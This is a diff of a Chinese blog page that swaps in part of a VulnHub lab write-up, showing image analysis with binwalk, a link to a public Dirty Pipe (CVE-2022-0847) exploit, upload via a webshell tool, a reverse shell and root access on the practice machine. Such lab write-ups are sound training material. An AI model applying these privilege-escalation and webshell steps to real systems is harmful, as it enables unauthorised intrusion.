+<p><img src="/./../imgs/$%7Bfiilename%7D/image-20240127214218700.png" alt="image-20240127214218700"></p>
+<p>问题就是它了，网站上看不出来问题下载下看看，这里用到了一下图片隐写的知识</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">wget</span> http://192.168.52.135/.cypher-neo.png
+binwalk .cypher-neo.png<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+
+<p><img src="/./../imgs/$%7Bfiilename%7D/image-20240127214457908.png" alt="image-20240127214457908"></p>
+<p>！！！！捆绑好家伙行</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">binwalk <span class="token parameter variable">-e</span> .cypher-neo.png --run-as<span class="token operator">=</span>root<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p><img src="/./../imgs/$%7Bfiilename%7D/image-20240127214753334.png" alt="image-20240127214753334"></p>
+<p>研究了半天都没有研究出来什么东西，我们直接进行提权看看</p>
+<p><img src="/./../imgs/$%7Bfiilename%7D/image-20240127221919347.png" alt="image-20240127221919347"></p>
+<p><img src="/./../imgs/$%7Bfiilename%7D/image-20240127222202901.png" alt="image-20240127222202901"></p>
+<h4 id="6-进行提权"><a href="#6-进行提权" class="headerlink" title="6)进行提权"></a>6)进行提权</h4><p>查看一下当前linux的内核版本</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">uname</span> <span class="token parameter variable">-a</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p><img src="/./../imgs/$%7Bfiilename%7D/image-20240127222852117.png" alt="image-20240127222852117"></p>
+<p>系统是Linux4.x|5.x看看有没有漏洞能利用，直接发现有漏洞能直接用CVE-2022-0847</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">https://github.com/r1is/CVE-2022-0847<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>下载下去直接传上去跑就行（蚁剑直接传上去就可以了）（或者使用shell直接到靶机里）,给权限直接跑</p>
+<p><img src="/./../imgs/$%7Bfiilename%7D/image-20240127224523016.png" alt="image-20240127224523016"></p>
+<p>蚁剑里面有bug，我们反弹shell，在kali里面进行</p>
+<p><img src="/./../imgs/$%7Bfiilename%7D/image-20240127225053522.png" alt="image-20240127225053522"></p>
+<p><img src="/./../imgs/$%7Bfiilename%7D/image-20240127225211867.png" alt="image-20240127225211867"></p>
+<p>我们可以看到提权已经是root了，我们直接查看flag即可</p>
+<p><img src="/./../imgs/$%7Bfiilename%7D/image-20240127225252646.png" alt="image-20240127225252646"></p>
+<p><img src="/./../imgs/$%7Bfiilename%7D/image-20240127225316320.png" alt="image-20240127225316320"></p>
 <h1 id="三-相关资源"><a href="#三-相关资源" class="headerlink" title="三.相关资源"></a>三.相关资源</h1><p>1.靶场下载地址 </p>
 <p>2.nmap</p>
 <p>3.arp-scan </p>
@@ -531,16 +550,17 @@ This box was created <span class="token keyword">to</span> be an Easy box<span c
 <p>6.[ 渗透工具篇 ] EHole(棱洞)3.0安装部署及详解（linux &amp; win） </p>
 <p>7.nikto工具的使用</p>
 <p>8.dirsearch目录扫描</p>
-<p>9.enum4linux 工具的使用</p>
+<p>9.burp工具的使用</p>
 <p>10.kali反弹shell</p>
-<p>11.tar</p>
-<p>12.getcap</p>
+<p>11.蚁剑的使用</p>
+<p>12.gobuster.ffuf</p>
+<p>13.binwalk工具的使用</p>
 
     </article>
     
     <div class="read-nums">
       <!-- id 将作为查询条件 -->
-      <span id="2024/01/15/vulnhub靶场之EMPIRE-BREAKOUT/" class="leancloud_visitors" data-flag-title="Your Article Title">
+      <span id="2024/01/26/vulnhub靶场之Matrix-Breakout/" class="leancloud_visitors" data-flag-title="Your Article Title">
         <em class="post-meta-item-text">浏览量</em>
         <i class="leancloud-visitors-count"></i>
       </span>
@@ -556,20 +576,20 @@ This box was created <span class="token keyword">to</span> be an Easy box<span c
     <div class="article-catelogue--wrapper">
       <div class="catelogue catelogue-1">
         <h3>目录</h3>
-        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%B8%80-%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA"><span class="toc-number">1.</span> <span class="toc-text">一.环境搭建</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#1-%E9%9D%B6%E5%9C%BA%E6%8F%8F%E8%BF%B0"><span class="toc-number">1.1.</span> <span class="toc-text">1.靶场描述</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-%E9%9D%B6%E5%9C%BA%E5%9C%B0%E5%9D%80"><span class="toc-number">1.2.</span> <span class="toc-text">2.靶场地址</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-%E5%90%AF%E5%8A%A8%E9%9D%B6%E5%9C%BA"><span class="toc-number">1.3.</span> <span class="toc-text">3.启动靶场</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%BA%8C-%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95"><span class="toc-number">2.</span> <span class="toc-text">二.渗透测试</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#1-%E7%9B%AE%E6%A0%87"><span class="toc-number">2.1.</span> <span class="toc-text">1.目标</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="toc-number">2.2.</span> <span class="toc-text">2.信息收集</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E5%AF%BB%E6%89%BE%E9%9D%B6%E5%9C%BA%E7%9C%9F%E5%AE%9Eip"><span class="toc-number">2.2.1.</span> <span class="toc-text">(1)寻找靶场真实ip</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E6%8E%A2%E6%B5%8B%E7%AB%AF%E5%8F%A3%E5%8F%8A%E6%9C%8D%E5%8A%A1"><span class="toc-number">2.2.2.</span> <span class="toc-text">(2)探测端口及服务</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-web%E6%8C%87%E7%BA%B9%E8%AF%86%E5%88%AB"><span class="toc-number">2.2.3.</span> <span class="toc-text">(3)web指纹识别</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95"><span class="toc-number">2.3.</span> <span class="toc-text">3.渗透测试</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E8%AE%BF%E9%97%AEweb%E6%9C%8D%E5%8A%A1"><span class="toc-number">2.3.1.</span> <span class="toc-text">(1)访问web服务</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E6%89%AB%E6%8F%8Fweb%E6%9C%8D%E5%8A%A1"><span class="toc-number">2.3.2.</span> <span class="toc-text">(2)扫描web服务</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-%E6%A3%B1%E6%B4%9E3-0%E6%8C%87%E7%BA%B9%E8%AF%86%E5%88%AB"><span class="toc-number">2.3.2.1.</span> <span class="toc-text">1)棱洞3.0指纹识别</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-nikto%E6%89%AB%E6%8F%8F%E7%BD%91%E7%AB%99%E7%BB%93%E6%9E%84"><span class="toc-number">2.3.2.2.</span> <span class="toc-text">2)nikto扫描网站结构</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-dirsearch%E7%9B%AE%E5%BD%95%E6%89%AB%E6%8F%8F"><span class="toc-number">2.3.2.3.</span> <span class="toc-text">3)dirsearch目录扫描</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-1"><span class="toc-number">2.3.3.</span> <span class="toc-text">(3)渗透测试</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-enum4linux-%E6%94%B6%E9%9B%86%E7%94%A8%E6%88%B7"><span class="toc-number">2.3.3.1.</span> <span class="toc-text">1)enum4linux 收集用户</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-%E7%99%BB%E5%BD%95%E7%94%A8%E6%88%B7%E5%90%8D"><span class="toc-number">2.3.3.2.</span> <span class="toc-text">2)登录用户名</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-%E6%8F%90%E6%9D%83"><span class="toc-number">2.3.4.</span> <span class="toc-text">(4)提权</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%B8%89-%E7%9B%B8%E5%85%B3%E8%B5%84%E6%BA%90"><span class="toc-number">3.</span> <span class="toc-text">三.相关资源</span></a></li></ol>
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%B8%80-%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA"><span class="toc-number">1.</span> <span class="toc-text">一.环境搭建</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#1-%E9%9D%B6%E5%9C%BA%E6%8F%8F%E8%BF%B0"><span class="toc-number">1.1.</span> <span class="toc-text">1.靶场描述</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-%E9%9D%B6%E5%9C%BA%E5%9C%B0%E5%9D%80"><span class="toc-number">1.2.</span> <span class="toc-text">2.靶场地址</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-%E5%90%AF%E5%8A%A8%E9%9D%B6%E5%9C%BA"><span class="toc-number">1.3.</span> <span class="toc-text">3.启动靶场</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%BA%8C-%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95"><span class="toc-number">2.</span> <span class="toc-text">二.渗透测试</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#1-%E7%9B%AE%E6%A0%87"><span class="toc-number">2.1.</span> <span class="toc-text">1.目标</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="toc-number">2.2.</span> <span class="toc-text">2.信息收集</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E5%AF%BB%E6%89%BE%E9%9D%B6%E5%9C%BA%E7%9C%9F%E5%AE%9Eip"><span class="toc-number">2.2.1.</span> <span class="toc-text">(1)寻找靶场真实ip</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E6%8E%A2%E6%B5%8B%E7%AB%AF%E5%8F%A3%E5%8F%8A%E6%9C%8D%E5%8A%A1"><span class="toc-number">2.2.2.</span> <span class="toc-text">(2)探测端口及服务</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-web%E6%8C%87%E7%BA%B9%E8%AF%86%E5%88%AB"><span class="toc-number">2.2.3.</span> <span class="toc-text">(3)web指纹识别</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95"><span class="toc-number">2.3.</span> <span class="toc-text">3.渗透测试</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E8%AE%BF%E9%97%AEweb%E6%9C%8D%E5%8A%A1"><span class="toc-number">2.3.1.</span> <span class="toc-text">(1)访问web服务</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E6%89%AB%E6%8F%8Fweb%E6%9C%8D%E5%8A%A1"><span class="toc-number">2.3.2.</span> <span class="toc-text">(2)扫描web服务</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-%E6%A3%B1%E6%B4%9E3-0%E6%8C%87%E7%BA%B9%E8%AF%86%E5%88%AB"><span class="toc-number">2.3.2.1.</span> <span class="toc-text">1)棱洞3.0指纹识别</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-nikto%E6%89%AB%E6%8F%8F%E7%BD%91%E7%AB%99%E7%BB%93%E6%9E%84"><span class="toc-number">2.3.2.2.</span> <span class="toc-text">2)nikto扫描网站结构</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-dirsearch%E7%9B%AE%E5%BD%95%E6%89%AB%E6%8F%8F"><span class="toc-number">2.3.2.3.</span> <span class="toc-text">3)dirsearch目录扫描</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-1"><span class="toc-number">2.3.3.</span> <span class="toc-text">(3)渗透测试</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-%E8%AE%BF%E9%97%AEgraffiti-php%E9%A1%B5%E9%9D%A2"><span class="toc-number">2.3.3.1.</span> <span class="toc-text">1)访问graffiti.php页面</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-%E8%AE%BF%E9%97%AEgraffiti-txt%E9%A1%B5%E9%9D%A2"><span class="toc-number">2.3.3.2.</span> <span class="toc-text">2)访问graffiti.txt页面</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-%E6%8A%93%E5%8C%85%E5%86%99%E5%85%A5%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC"><span class="toc-number">2.3.3.3.</span> <span class="toc-text">3)抓包写入一句话木马</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#4-%E5%8F%8D%E5%BC%B9webshell"><span class="toc-number">2.3.3.4.</span> <span class="toc-text">4)反弹webshell</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#5-%E5%88%86%E6%9E%90%E5%9B%BE%E7%89%87"><span class="toc-number">2.3.3.5.</span> <span class="toc-text">5)分析图片</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#6-%E8%BF%9B%E8%A1%8C%E6%8F%90%E6%9D%83"><span class="toc-number">2.3.3.6.</span> <span class="toc-text">6)进行提权</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%B8%89-%E7%9B%B8%E5%85%B3%E8%B5%84%E6%BA%90"><span class="toc-number">3.</span> <span class="toc-text">三.相关资源</span></a></li></ol>
       </div>
       
         <div class="catelogue catelogue-2">
           
             <p>
               <span>上一篇：</span>
-              <a href="/2024/01/26/vulnhub靶场之Matrix-Breakout/">vulnhub靶场之Matrix-Breakout 2 Morpheus</a>
+              <a href="/2024/01/28/vulnhub靶场之Noob/">vulnhub靶场之Thales</a>
             </p>
            
           
             <p>
               <span>下一篇</span>
-              <a href="/2024/01/13/vulnhub靶场之Five86-2/">vulnhub靶场之Five86-2</a>
+              <a href="/2024/01/15/vulnhub靶场之EMPIRE-BREAKOUT/">vulnhub靶场之EMPIRE:BREAKOUT</a>
             </p>
           
         </div>
@@ -592,7 +612,7 @@ This box was created <span class="token keyword">to</span> be an Easy box<span c
     recordIP: config.recordIP,
     visitor: config.visitor,
     enableQQ: config.enableQQ,
-    path: '2024/01/15/vulnhub靶场之EMPIRE-BREAKOUT/'
+    path: '2024/01/26/vulnhub靶场之Matrix-Breakout/'
   })
 </script>
 
